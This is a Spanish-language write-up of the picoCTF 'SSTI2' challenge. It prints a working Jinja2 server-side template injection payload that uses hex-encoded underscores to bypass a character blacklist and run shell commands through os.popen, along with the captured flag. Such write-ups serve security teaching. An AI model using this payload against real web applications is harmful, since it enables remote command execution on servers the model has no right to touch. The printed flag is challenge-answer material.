**RETO:**  
SSTI2

**DESCRIPCIÓN:**  
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website here!  
[http://shape-facility.picoctf.net:61218/](http://shape-facility.picoctf.net:61218/)

**SOLUCIÓN:**

1. **Análisis del sitio web**:
    
    - El sitio presentaba un formulario similar al reto SSTI1 pero con sanitización mejorada
        
    - Los payloads SSTI básicos como `{{7*7}}` eran filtrados
        
    - La aplicación eliminaba caracteres especiales problemáticos
        
2. **Bypass de la sanitización**:
    
    - Utilicé un payload SSTI avanzado con caracteres en hexadecimal para evadir los filtros
        
    - El payload usaba `\x5f` para representar el guión bajo `_` que estaba siendo filtrado
        
    - El payload final fue:
        
        text
        
        {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
        
3. **Obtención de la flag**:
    
    - El payload ejecutó el comando `cat flag` en el servidor
        
    - La respuesta del servidor contenía la flag
        

**FLAG OBTENIDA:**  
`picoCTF{sst1_f1lt3r_byp4ss_e39c23ee}`

**NOTAS ADICIONALES:**

- La flag `sst1_f1lt3r_byp4ss` describe exactamente la técnica utilizada
    
- Este reto demostró que la sanitización basada en blacklisting puede ser evadida con encoding
    
- El uso de hexadecimal (`\x5f`) permitió bypass los filtros de caracteres especiales
    
- El payload accedió a la cadena de objetos de Jinja2 para ejecutar comandos del sistema
    
- La vulnerabilidad permitió ejecución remota de comandos a pesar de las medidas de seguridad